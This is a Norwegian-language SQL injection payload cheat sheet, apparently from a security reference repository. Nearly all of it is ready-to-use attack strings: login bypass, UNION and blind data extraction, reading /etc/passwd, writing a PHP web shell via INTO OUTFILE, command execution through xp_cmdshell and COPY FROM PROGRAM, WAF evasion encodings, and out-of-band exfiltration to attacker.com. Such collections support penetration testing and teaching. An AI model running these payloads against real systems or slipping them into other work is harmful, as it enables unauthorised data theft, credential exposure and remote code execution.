# 💉 Payloads for SQL-injeksjon

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SQLi.tr.md) • [🇬🇷 Ελληνικά](SQLi.el.md)

> **Begreper og miljø:** SQLi betyr at inndata endrer en SQL-spørring. Blind injeksjon observerer forskjeller i svar eller tid, og out-of-band bruker en annen kanal. Syntaks, datatyper, kommentarer og funksjoner er DBMS- og versjonsavhengige; filtilgang, systemkommandoer og nettverkskall krever særskilte forutsetninger og rettigheter. Ingen WAF-payload garanterer omgåelse. Eksemplene er bevart; sammenhold dem med [PortSwiggers DBMS-oversikt](https://portswigger.net/web-security/sql-injection/cheat-sheet).

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📋 Innholdsfortegnelse

- [Payloads for deteksjon](#-payloads-for-deteksjon)
- [Omgåelse av autentisering](#-omgåelse-av-autentisering)
- [UNION-basert injeksjon](#-union-basert-injeksjon)
- [Feilbasert injeksjon](#-feilbasert-injeksjon)
- [Blind SQL-injeksjon](#-blind-sql-injeksjon)
- [Tidsbasert injeksjon](#-tidsbasert-injeksjon)
- [DBMS-spesifikke eksempler](#-dbms-spesifikke-eksempler)
- [Omgåelse av WAF](#-omgåelse-av-waf)
- [Utenfor den vanlige responskanalen (out-of-band)](#-utenfor-den-vanlige-responskanalen-out-of-band)

---

## 🔍 Payloads for deteksjon

### Grunnleggende deteksjon

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Boolsk deteksjon

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Aritmetisk deteksjon

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### Sammenkjeding av strenger

```sql
' || 'test
' + 'test
' 'test
```

---

## 🔓 Omgåelse av autentisering

### Omgåelse av pålogging

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Brukernavnfelt

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Passordfelt

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Vanlige kombinasjoner for omgåelse

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

## 🔗 UNION-basert injeksjon

### Finne antall kolonner

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continue until error...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Grunnleggende UNION

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Uthenting av data

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### UNION med kommentarer

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="-feilbasert-injeksjon"></a>
## ⚠️ Feilbasert injeksjon

### Feilbasert MySQL-injeksjon

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### Feilbasert MSSQL-injeksjon

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### Feilbasert PostgreSQL-injeksjon

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Feilbasert Oracle-injeksjon

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## 🔮 Blind SQL-injeksjon

### Boolsk blind injeksjon

```sql
-- Sann betingelse
' AND 1=1--
' AND 'a'='a'--

-- Usann betingelse
' AND 1=2--
' AND 'a'='b'--

-- Uthenting av tegn
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Binærsøk

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...narrow down to exact character...
```

### Finne lengde

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Kartlegging av tabeller og kolonner

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="-tidsbasert-injeksjon"></a>
## ⏱️ Tidsbasert injeksjon

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="-dbms-spesifikke-eksempler"></a>
## 🗄️ DBMS-spesifikke eksempler

### MySQL-payloads

```sql
-- Versjon
' UNION SELECT @@version--
' UNION SELECT version()--

-- Gjeldende bruker
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Database
' UNION SELECT database()--

-- Tabeller
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Kolonner
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Les fil
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Skriv fil
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### PostgreSQL-payloads

```sql
-- Versjon
' UNION SELECT version()--

-- Gjeldende bruker
' UNION SELECT current_user--

-- Database
' UNION SELECT current_database()--

-- Tabeller
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Les fil
' UNION SELECT pg_read_file('/etc/passwd')--

-- Kommandokjøring
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### MSSQL-payloads

```sql
-- Versjon
' UNION SELECT @@version--

-- Gjeldende bruker
' UNION SELECT SYSTEM_USER--

-- Database
' UNION SELECT DB_NAME()--

-- Tabeller
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Kommandokjøring
'; EXEC xp_cmdshell 'whoami';--

-- Aktiver xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Oracle-payloads

```sql
-- Versjon
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Gjeldende bruker
' UNION SELECT user FROM dual--

-- Database
' UNION SELECT ora_database_name FROM dual--

-- Tabeller
' UNION SELECT table_name FROM all_tables--

-- Kolonner
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="-omgåelse-av-waf"></a>
## 🛡️ Omgåelse av WAF

### Omgåelse av mellomromsfilter

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Omgåelse med kommentarer

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Varianter av store og små bokstaver

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Koding

```sql
-- URL-koding
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Dobbel URL-koding
%2527%20OR%201=1--

-- Heksadesimal koding
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Omgåelse av nøkkelordfilter

```sql
-- Omgåelse av UNION-filter
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- Omgåelse av SELECT-filter
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- Omgåelse av AND/OR-filter
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP (HTTP Parameter Pollution, parameterforurensning)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

## 📡 Utenfor den vanlige responskanalen (out-of-band)

### MySQL OOB

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### MSSQL OOB

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### PostgreSQL OOB

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### Oracle OOB

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

## 📊 Hurtigreferanse

### Rekkefølge for deteksjon

1. `'` – enkelt anførselstegn
2. `"` – dobbelt anførselstegn
3. `' OR '1'='1` – boolsk injeksjon
4. `' AND SLEEP(5)--` – tidsbasert
5. `' UNION SELECT NULL--` – UNION-basert

### Vanlige endepunkter

```
- Påloggingsskjemaer
- Søkefelt
- Bruker-ID-er i URL-er
- Verdier i informasjonskapsler
- HTTP-headere (User-Agent, Referer)
- API-parametere
```

### SQL-kommentarer etter DBMS

| DBMS | Kommentarer |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

## 📚 Ressurser

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 Samling av SQL-injeksjonspayloads</b><br>
  <i>Bare til undervisningsformål!</i>
</p>
